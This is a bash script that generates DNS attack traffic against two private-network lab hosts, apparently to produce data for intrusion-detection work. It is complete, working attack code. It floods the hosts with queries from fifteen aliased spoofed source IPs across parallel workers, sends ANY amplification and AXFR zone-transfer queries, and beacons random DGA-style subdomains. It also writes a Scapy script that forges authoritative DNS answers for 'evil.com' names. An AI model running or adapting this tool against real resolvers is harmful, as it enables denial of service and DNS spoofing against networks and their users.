#!/usr/bin/env bash
#
# dns_vm3_random_optimized.sh – DNS Attacks Traffic Generator (OPTIMIZED)
# • Duration: 600 s (10 min)
# • Optimized for max throughput without saturating local machine
# • DNS traffic only - no other protocols
#

# 1) Run as root for spoofing
if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo for spoofing and IP alias" >&2
  exit 1
fi

# 2) Check dependencies
missing=()
for cmd in dig python3 openssl xxd ncat; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done

# Python scapy - Optimized verification
echo "Verifying Scapy..."
SCAPY_AVAILABLE=false

if python3 -c "
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
try:
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS, DNSRR, DNSQR
    from scapy.sendrecv import send
    print('OK')
except Exception as e:
    print('ERROR:', e)
    sys.exit(1)
" 2>/dev/null | grep -q "OK"; then
  SCAPY_AVAILABLE=true
  echo "Scapy verified correctly."
else
  echo "Scapy not available. dns_spoof will be disabled."
  SCAPY_AVAILABLE=false
fi

if (( ${#missing[@]} )); then
  echo "Missing: ${missing[*]}" >&2
  echo "Install with: sudo apt update && sudo apt install dnsutils python3 python3-pip openssl xxd ncat" >&2
  exit 1
fi

# 3) Optimized configuration
duration=600
end_time=$((SECONDS + duration))
DURATION=$duration
END=$end_time

TARGETS=(192.168.56.101 192.168.56.102)
SRC_IPS=(192.168.56.{240..254})

iface="enp0s3"


# Configuring system limits for better performance
echo "Optimizing system..."
ulimit -n 65536  # More file descriptors
echo 65536 > /proc/sys/net/core/somaxconn 2>/dev/null || :
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || :

# Creating alias IPs more efficiently
echo "Configuring alias IPs..."
for ip in ${SRC_IPS[@]}; do
  if ! ip addr show "$iface" | grep -q "$ip"; then
    ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
  fi
done

TUNNEL_DOMAIN="tunel.test"
DGA_DOMAIN="dga.test" 
IO_PWD="secretpass"

# Optimized techniques (removed iodine as it is slow)
if $SCAPY_AVAILABLE; then
  techs=(dns_amp_any dns_zone_xfr dns_spoof dga_beacon dns_flood dns_random)
else
  techs=(dns_amp_any dns_zone_xfr dga_beacon dns_flood dns_random)
  echo "NOTE: dns_spoof disabled (Scapy not available)"
fi

# Pre-built DNS query pool for higher speed
declare -a QUERY_POOL=(
  "ANY"
  "A"
  "AAAA" 
  "MX"
  "NS"
  "TXT"
  "CNAME"
  "PTR"
  "SOA"
  "SRV"
)

declare -a DOMAIN_POOL=(
  "example.com"
  "$DGA_DOMAIN"
  "google.com"
  "facebook.com" 
  "amazon.com"
  "microsoft.com"
  "apple.com"
  "netflix.com"
)

# Optimized dig function (no output, faster)
fast_dig() {
  local src_ip=$1
  local query_type=$2
  local domain=$3
  local target=$4
  
  # Use shorter timeout and no retries for max speed
  timeout 1 dig -b "$src_ip" "$query_type" "$domain" @"$target" +time=1 +tries=1 +short +noall >/dev/null 2>&1 &
}

# Function for multiple simultaneous queries
multi_dig() {
  local src_ip=$1
  local target=$2
  local count=${3:-5}
  
  for ((i=0; i<count; i++)); do
    local qtype=${QUERY_POOL[RANDOM % ${#QUERY_POOL[@]}]}
    local domain=${DOMAIN_POOL[RANDOM % ${#DOMAIN_POOL[@]}]}
    fast_dig "$src_ip" "$qtype" "$domain" "$target"
  done
}

# More efficient sleep function
micro_sleep() {
  # Very short sleep for max throughput
  sleep 0.01
}

# Function to clean up on exit
cleanup() {
  echo "Cleaning up..."
  for ip in ${SRC_IPS[@]}; do
    ip addr del "$ip"/24 dev "$iface" 2>/dev/null || :
  done
  # Kill all child processes
  pkill -P $$ 2>/dev/null || :
  echo "Cleanup completed."
}

trap cleanup EXIT INT TERM

# Optimized Python script for DNS spoofing
create_optimized_spoof() {
  local src_ip="$1"
  local tgt_ip="$2"
  
  cat > /tmp/dns_spoof_opt_$$.py << 'EOF'
#!/usr/bin/env python3
import sys
import random
import threading
import time
sys.path.insert(0, '/usr/lib/python3/dist-packages')

try:
    from scapy.layers.inet import IP, UDP
    from scapy.layers.dns import DNS, DNSRR, DNSQR
    from scapy.sendrecv import send
    
    def send_spoof_batch():
        for _ in range(5):  # Batch of 5 packets
            pkt = IP(src=sys.argv[2], dst=sys.argv[1])/UDP(sport=53, dport=random.randint(1024,65535))/DNS(
                id=random.randint(0, 65535),
                qr=1, aa=1,
                qd=DNSQR(qname=f'spoof{random.randint(1000,9999)}.evil.com'),
                an=DNSRR(rrname=f'spoof{random.randint(1000,9999)}.evil.com', 
                         rdata=f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}')
            )
            send(pkt, verbose=False)
    
    send_spoof_batch()
    
except:
    pass
EOF
  
  timeout 2 python3 /tmp/dns_spoof_opt_$$.py "$src_ip" "$tgt_ip" 2>/dev/null &
  rm -f /tmp/dns_spoof_opt_$$.py 2>/dev/null || :
}

# Function to generate more intensive DGA traffic
intensive_dga() {
  local src_ip=$1
  local target=$2
  
  for _ in {1..10}; do
    local rnd=$(openssl rand -hex 8)
    fast_dig "$src_ip" "A" "$rnd.$DGA_DOMAIN" "$target"
  done
}

# Simple DNS flood function
dns_flood() {
  local src_ip=$1
  local target=$2
  
  for _ in {1..15}; do
    local subdomain=$((RANDOM % 10000))
    fast_dig "$src_ip" "A" "flood$subdomain.test.com" "$target"
  done
}

# Random DNS queries function
dns_random() {
  local src_ip=$1
  local target=$2
  
  for _ in {1..8}; do
    local qtype=${QUERY_POOL[RANDOM % ${#QUERY_POOL[@]}]}
    local domain="random$((RANDOM % 1000)).${DOMAIN_POOL[RANDOM % ${#DOMAIN_POOL[@]}]}"
    fast_dig "$src_ip" "$qtype" "$domain" "$target"
  done
}

# Worker function for parallel processing
dns_worker() {
  local worker_id=$1
  local worker_end=$2
  
  while (( SECONDS < worker_end )); do
    local tech=${techs[RANDOM % ${#techs[@]}]}
    local tgt=${TARGETS[RANDOM % ${#TARGETS[@]}]}
    local src=${SRC_IPS[RANDOM % ${#SRC_IPS[@]}]}
    
    case "$tech" in
      dns_amp_any)
        multi_dig "$src" "$tgt" 8
        ;;
      dns_zone_xfr)
        fast_dig "$src" "AXFR" "$DGA_DOMAIN" "$tgt"
        ;;
      dns_spoof)
        if $SCAPY_AVAILABLE; then
          create_optimized_spoof "$src" "$tgt"
        fi
        ;;
      dga_beacon)
        intensive_dga "$src" "$tgt"
        ;;
      dns_flood)
        dns_flood "$src" "$tgt"
        ;;
      dns_random)
        dns_random "$src" "$tgt"
        ;;
    esac
    
    # Concurrency control per worker
    while (( $(jobs -r | wc -l) > 50 )); do sleep 0.05; done
    
    micro_sleep
  done
}

# Main optimized loop with parallel workers
echo "=== VM3: DNS Attacks OPTIMIZED (${DURATION}s) ==="
echo "Interface: $iface"
echo "Src IPs: ${#SRC_IPS[@]} configured"
echo "Targets: ${TARGETS[*]}"
echo "Techniques: ${techs[*]}"
echo "Parallel Workers: 4"
echo

# Launch 4 parallel workers for max throughput
for worker in {1..4}; do
  dns_worker "$worker" "$END" &
  echo "Worker $worker started (PID: $!)"
done

# Progress monitor
last_report=0
while (( SECONDS < END )); do
  current_time=$SECONDS
  
  # Report progress every 30 seconds
  if (( current_time - last_report >= 30 )); then
    remaining=$((END - SECONDS))
    active_jobs=$(jobs -r | wc -l)
    echo "[$(date +%T)] Progress: ${remaining}s remaining, $active_jobs active jobs"
    last_report=$current_time
  fi
  
  sleep 5
done

# Wait for workers to finish
echo "Waiting for workers to finish..."
wait

echo "=== DNS Attacks OPTIMIZED finished ==="
echo "Final statistics:"
echo "- Total duration: ${DURATION}s"
echo "- Workers used: 4"
echo "- Techniques employed: ${#techs[@]}"
